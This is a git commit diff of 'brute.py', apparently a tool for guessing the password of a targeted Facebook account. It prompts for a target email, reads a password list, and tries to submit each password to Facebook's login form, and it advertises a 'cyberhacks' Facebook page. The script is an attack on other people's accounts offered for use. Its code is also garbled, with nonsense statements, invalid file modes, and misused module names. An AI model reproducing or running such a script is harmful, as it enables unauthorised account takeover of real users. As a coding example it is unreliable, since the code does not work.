7b56ecc45c905c2e5aa83cc9807f80c5498d9692
Cybernetics <79071277+shade234sherif@users.noreply.github.com>
2022-04-06 23:47:27 +0100

    Add files via upload

--- brute.py
+++ brute.py
@@ -1,11 +1,9 @@
-from http.client import REQUEST_TIMEOUT
+from http.client import responses
 import sys 
 import os
 import time
-from wsgiref import headers
 if sys.version_info[0] !=3:
    print(' Required version of python3 .please install python3 then restart')
-   print('restart programme after that')
 try:
     import tokenize
     
@@ -14,7 +12,7 @@ except:
 sys.exit 
 import code
 import fileinput
-from socket import timeout
+
 import sys
 from argparse import FileType
 from ast import Break, Continue, If, Try, excepthandler
@@ -24,7 +22,7 @@ import webbrowser
 import urllib
 from nturl2path import url2pathname
 import time
-from urllib.request import URLopener, urlopen 
+from urllib.request import urlopen 
 
 3<4
 G=444333
@@ -32,37 +30,34 @@ B=443333
 R=433333
 Y=333333
 
-print('\033[1;32m ___   ___     ___   ___   _   _   _____   ___    __   __  ___   ___     ___       ____')
-print('\033[1;32m| __| | _ )   | _ ) | _ \ | | | | |_   _| | __|   \ \ / / | __| | _ \   |_  )     |__  |')
-print('\033[1;32m| _|  | _ \   | _ \ |   / | |_| |   | |   | _|     \ V /  | _|  |   /    / /   _    / /') 
-print('\033[1;32m|_|   |___/   |___/ |_|_\  \___/    |_|   |___|     \_/   |___| |_|_\   /___| (_)  /_/')
+print('\033[1;32m ___   ___     ___   ___   _   _   _____   ___    __   __  ___   ___     ___       ____\033[1;31m')
+print('\033[1;32m| __| | _ )   | _ ) | _ \ | | | | |_   _| | __|   \ \ / / | __| | _ \   |_  )     |__  |\033[1;31m')
+print('\033[1;32m| _|  | _ \   | _ \ |   / | |_| |   | |   | _|     \ V /  | _|  |   /    / /   _    / /\033[1;31m') 
+print('\033[1;32m|_|   |___/   |___/ |_|_\  \___/    |_|   |___|     \_/   |___| |_|_\   /___| (_)  /_/\033[1;31m')
 print('FOLLOW US ON FB:www.facebook.com/cyberhacks6')
+file=open('passwords.txt','r')
 webbrowser.open('www.facebook.com/cyberhacks6')
-file=open('password.txt','r')
 
-import mechanize 
-webbrowser = mechanize.browser()
-webbrowser.addheaders=[('User-Agent',headers['User-Agent'])]
-webbrowser.set_handle_robots(False)
-excepthandler
+def login( email, password):
+    urlopen = 'https://www.facebook.com/login.php'
+    header = {'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36'}
+email = input("INPUT TARGET ACOOUNT MAIL/PROFILE LINK:")
+print(" TARGET MAIL /PROF LINK:",email+"")
 ConnectionError
-print("FAILED TO CONNECT TO THE INTERNET")
+print("\003[2;43m NO INTERNET CONNECTION OR CONNECTION TIMEOUT\033[0;0m")
 
-urlopen = 'https://www.facebook.com/login.php'
-header = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36'}
-email = input("enter email of target:")
-print("\nPlease wait while the modules do the hacking",email+"")
 i=0
-while FileType :
+while file:
+    password=open('password.txt','o','r' )
     password=file.readline().strip()
     i+=1
     if len(password) < 10:
-      continue
-    print=str(i) +" : ",password
-    response = webbrowser.open(urlopen)
-
+     print=str(i) +" : ",password
+    continue
+request = webbrowser.open('urlopen')
 Try
-If; response; code == 200
+ 
+If; responses; code == 200
 webbrowser.select_form(nr=0)()
 webbrowser.form['email']=email
 webbrowser.form['pass']=password
@@ -72,10 +67,6 @@ response_data = response.read()
 print("your password is : ",password)
 Break
 
-excepthandler
-REQUEST_TIMEOUT
-print('connection timeout')
-timeout(5)
 sys.exit
 
 
